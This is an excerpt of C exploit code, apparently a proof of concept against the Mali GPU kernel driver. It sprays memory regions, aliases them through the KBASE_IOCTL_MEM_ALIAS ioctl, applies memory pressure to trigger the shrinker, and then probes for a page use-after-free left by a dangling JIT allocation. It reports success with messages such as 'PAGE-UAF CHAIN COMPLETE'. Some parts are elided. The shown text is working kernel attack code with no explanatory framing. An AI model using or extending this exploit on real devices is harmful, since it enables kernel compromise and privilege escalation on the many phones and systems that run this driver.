...
static int alias_region_ioctl(void *real_va, unsigned long pages)
{
	...
	ai.handle.basep.handle = (__u64)real_va;
	ai.offset = 0;
	ai.length = pages;
	al.in.aliasing_info = (__u64)&ai;
	return ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al);
}
...
int main(void)
{
	...
	*(__u64 *)wb = 0;
	...
	/* alias each sprayed region (GPU-side only) BEFORE the dangling free */
	void *sp_va[N_SPRAY];
	for (int i = 0; i < N_SPRAY; i++) {
		sp_va[i] = sp[i];
		if (alias_region_ioctl(sp_va[i], REG_PAGES) < 0) { perror("alias ioctl"); return 1; }
	}
	printf("[*] aliased all %d regions\n", N_SPRAY);
	...
	/* shrinker round 2: victim's pages freed + region object destroyed */
	pressure(1024);
	sleep(2);
	...
	for (int i = 0; i < N_SPRAY; i++) {
		union kbase_ioctl_mem_query q;
		memset(&q, 0, sizeof(q));
		q.in.gpu_addr = (__u64)sp_va[i];
		q.in.query = KBASE_MEM_QUERY_VA_SIZE;
		if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) {
			printf("[+] region %d (va %p) is GONE: %s\n", i, sp_va[i], strerror(errno));
			victim = i;
		}
	}
	if (victim >= 0)
		printf("[+] PAGE-UAF CHAIN COMPLETE: region #%d destroyed via dangling jit_alloc while its alias survives\n", victim);
	else
		printf("[-] all regions still present; chain did not land this run\n");
	return 0;
}
